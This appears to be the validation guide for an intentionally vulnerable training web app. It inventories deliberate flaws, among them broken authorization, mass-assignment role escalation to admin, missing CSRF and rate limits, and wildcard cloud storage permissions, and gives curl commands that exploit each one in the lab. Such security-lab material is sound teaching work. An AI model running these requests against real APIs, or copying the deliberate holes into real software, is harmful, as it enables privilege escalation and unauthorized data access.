# Intentional Vulnerabilities and Validation

This application is an intentionally vulnerable security lab. Run these checks
only against deployments you own or are authorized to test, using synthetic data
and disposable accounts. This is an inventory of explicit lab findings, not a
complete security audit or a claim that other vulnerabilities cannot exist.

The examples use Bash-compatible syntax, `curl`, `jq`, and an authenticated
**viewer** session. Run from the repository root. Interactive documentation is
available at `/docs`; the OpenAPI definition is at `/openapi.json`.

## Findings

| Finding | Location | Expected vulnerable behavior |
| --- | --- | --- |
| Broken function-level authorization (API5) | Player POST/PATCH/DELETE | A viewer can perform roster writes that should require an admin |
| Broken object-level authorization (API1) | `GET /api/v1/reports/{id}` | A viewer can retrieve the administrator's private synthetic report |
| Mass assignment / privilege escalation (API3) | `PATCH /api/v1/users/me` | A viewer can change their own `Role` to `admin` |
| Excessive data exposure (API3) | Current-user responses | `InternalNote` and `Department` are returned; password hashes remain excluded |
| Missing resource controls (API4) | Login/session and list routes | No application rate limiter or bounded pagination |
| Missing API CSRF checks | Roster and profile mutations | Cookie-authenticated mutations work without a valid CSRF token |

See [the route implementation](../app/admin.py),
[OpenAPI definitions](../app/api_definition.py), and
[automated tests](../tests/test_admin.py).

## Set Up a Viewer Session

Select your EKS deployment and allocate an owner-only temporary cookie file:

```bash
set -o pipefail
BASE=$(terraform -chdir=terraform/aws-eks output -raw app_url)
JAR=$(mktemp)
CSRF=$(curl -fsS -c "$JAR" "$BASE/api/v1/session" | jq -er .csrf_token)
```

For another deployment, set `BASE` to its origin, for example
`http://localhost:8080`. Use HTTPS before transmitting non-disposable credentials;
the default public EKS ALB uses HTTP. Do not enable shell tracing (`set -x`) or
share cookie files, tokens, passwords, or verbose curl logs.

Log in with the generated viewer bootstrap password without placing it literally
in shell history or curl's command-line arguments:

```bash
LOGIN=$(terraform -chdir=terraform/aws-eks output -json bootstrap_passwords |
  jq -c '{username:"viewer",password:.viewer}' |
  curl -fsS -b "$JAR" -c "$JAR" \
    -H 'Content-Type: application/json' -H "X-CSRF-Token: $CSRF" \
    --data-binary @- "$BASE/api/v1/session")
printf '%s\n' "$LOGIN" | jq '.user | {Username,Role}'
```

Expect `Username: viewer` and `Role: viewer`. Stop if login fails or the account
already has the admin role. If its password was reset through the admin UI, the
Terraform bootstrap password will no longer work; use the current credential
through a secure input mechanism instead. Local Docker defaults are documented
in the main README; other clouds have their own Terraform outputs.

API login rotates the CSRF token. The session endpoints require a valid token;
the other intentional API mutation cases below do not.

## Read-Only Checks

### Authentication and Admin Controls

These controls should work and provide a baseline, not a vulnerability:

```bash
# Anonymous profile access: expect HTTP 401.
curl -sS -o /dev/null -w 'Anonymous profile: HTTP %{http_code}\n' \
  "$BASE/api/v1/users/me"

# Viewer access to HTML user management: expect HTTP 403.
curl -sS -b "$JAR" -o /dev/null -w 'Viewer admin page: HTTP %{http_code}\n' \
  "$BASE/admin/users"
```

### Excessive Data Exposure

```bash
curl -fsS -b "$JAR" "$BASE/api/v1/users/me" | jq
```

Expect `InternalNote` and `Department` in the response. `PasswordHash` and
`Version` should not be exposed. These records contain synthetic metadata.

### Broken Object-Level Authorization

```bash
# List only the viewer's own reports.
curl -fsS -b "$JAR" "$BASE/api/v1/reports" | jq

# Fetch an administrator-owned report directly: improperly succeeds with HTTP 200.
curl -fsS -b "$JAR" "$BASE/api/v1/reports/report-admin" | jq
```

The second response's `OwnerId` is not the viewer's `Id`. The route checks that
the object is a report, but does not enforce ownership. This assumes the default
bootstrap report has not been removed from the lab database.

### Unbounded Lists and Rate Controls

```bash
curl -fsS "$BASE/api/v1/players?limit=1" | jq length
```

`limit=1` is ignored; more than one result is returned when the roster contains
multiple players. There is no bounded pagination implemented in this route.

For a small, bounded traffic sample:

```bash
make api-traffic API_URL="$BASE" DURATION=5 RATE=2 WORKERS=1
```

The code has no application rate limiter. A few successful requests or the absence
of HTTP 429 in this short test do **not** prove there is no upstream WAF, proxy,
or higher-threshold rate limit. Do not perform unbounded load or password guessing.

## Mutating Checks

These steps change persistent lab data. Use a disposable viewer, and complete the
cleanup steps. In synced mode, a deleted synthetic player leaves a harmless
roster-override tombstone; ESPN syncs do not clear that record.

### Viewer Roster Writes and Missing CSRF Validation

Create a uniquely named synthetic player, without a CSRF header:

```bash
TEST_NAME="Security Validation Player $(date +%s)"
ID=$(jq -nc --arg name "$TEST_NAME" \
  '{JerseyNumber:998,Name:$name,Position:"QB"}' |
  curl -fsS -b "$JAR" -H 'Content-Type: application/json' \
    --data-binary @- "$BASE/api/v1/players" | jq -er .Id)
```

Expect HTTP 201 and an `Id`, despite using a viewer session. Update and delete
only the synthetic player created above:

```bash
curl -fsS -b "$JAR" -X PATCH -H 'Content-Type: application/json' \
  -d '{"Position":"WR"}' "$BASE/api/v1/players/$ID" | jq
curl -fsS -b "$JAR" -X DELETE -o /dev/null \
  -w 'Delete: HTTP %{http_code}\n' "$BASE/api/v1/players/$ID"
```

Expect HTTP 200 for PATCH and HTTP 204 for DELETE. This demonstrates missing
admin-role enforcement and missing mutation CSRF validation. HTML roster forms
still enforce both controls.

**CSRF qualification:** curl explicitly sends the cookie. Success does not by
itself establish browser-exploitable cross-site CSRF. SameSite=Lax cookies,
JSON content types, and CORS/preflight behavior affect browser exploitability.

### Self-Promotion Through Mass Assignment

This temporarily gives the viewer administrator privileges. Do not leave the
account promoted, and retain a separate administrator account for recovery.

```bash
curl -fsS -b "$JAR" -X PATCH -H 'Content-Type: application/json' \
  -d '{"Role":"admin"}' "$BASE/api/v1/users/me" | jq .Role
curl -sS -b "$JAR" -o /dev/null -w 'Promoted admin page: HTTP %{http_code}\n' \
  "$BASE/admin/users"
```

Expect `"admin"` and HTTP 200, rather than the earlier HTTP 403. The profile
handler permits writing `Role` without a role-management check.

Immediately restore the viewer role:

```bash
curl -fsS -b "$JAR" -X PATCH -H 'Content-Type: application/json' \
  -d '{"Role":"viewer"}' "$BASE/api/v1/users/me" | jq .Role
curl -sS -b "$JAR" -o /dev/null -w 'Restored viewer page: HTTP %{http_code}\n' \
  "$BASE/admin/users"
```

Expect `"viewer"` and HTTP 403. If rollback fails, use the separate administrator
to restore the role through user management before ending the test.

## Logout and Local Cleanup

Retrieve the current CSRF token and log out. This is a protected session action,
not one of the deliberately unprotected mutation routes:

```bash
CSRF=$(curl -fsS -b "$JAR" -c "$JAR" "$BASE/api/v1/session" | jq -er .csrf_token)
curl -fsS -b "$JAR" -c "$JAR" -X DELETE -H "X-CSRF-Token: $CSRF" \
  -o /dev/null -w 'Logout: HTTP %{http_code}\n' "$BASE/api/v1/session"
rm -f "$JAR"
unset LOGIN CSRF ID JAR TEST_NAME
```

Expect HTTP 204. Logging out does not revert a promoted role or undo roster
writes; complete those cleanup steps first.

## Cloud IAM Findings

These intentional permissions are deployment-specific and are not exposed as
ordinary app HTTP endpoints:

| Deployment | Deliberately excessive permission | Source |
| --- | --- | --- |
| AWS ECS | App task role: `s3:*` on `*` | [AWS IAM](../terraform/aws/iam.tf) |
| Azure | App managed identity: Storage Blob Data Owner at subscription scope | [Azure IAM](../terraform/azure/iam.tf) |
| GCP | Runtime service account: project-wide `roles/storage.admin` | [GCP IAM](../terraform/gcp/iam.tf) |
| AWS EKS | No corresponding broad storage grant; app role is scoped to three DynamoDB tables | [EKS IAM](../terraform/aws-eks/db.tf) |

Validate these through IAM/RBAC policy inspection or a scanner using the actual
runtime identity. Calling a cloud CLI as your administrator proves your own
permissions, not the app's. Plain curl requests to this Flask app cannot establish
the attached role's effective cloud permissions. Do not enumerate or mutate
unrelated cloud storage to demonstrate these findings.

## Deployment Exposure

The default EKS ALB is public HTTP, so traffic and credentials lack transport
encryption and session cookies are non-Secure. Configure ACM HTTPS before using
non-disposable credentials. Public EKS API network access is also enabled by
default, but still requires IAM authentication and Kubernetes authorization.
These exposure choices are distinct from the intentional application flaws and
the excessive storage roles above. See [the EKS guide](eks.md).

## Automated Validation

The isolated tests validate the deliberate API behavior without touching cloud
resources. In an environment with the app dependencies installed:

```bash
python3 -m unittest discover -s tests -p test_admin.py -v
```

Use the documented expected results to distinguish the deliberate lab findings
from regressions, network timeouts, expired credentials, or deployment failures.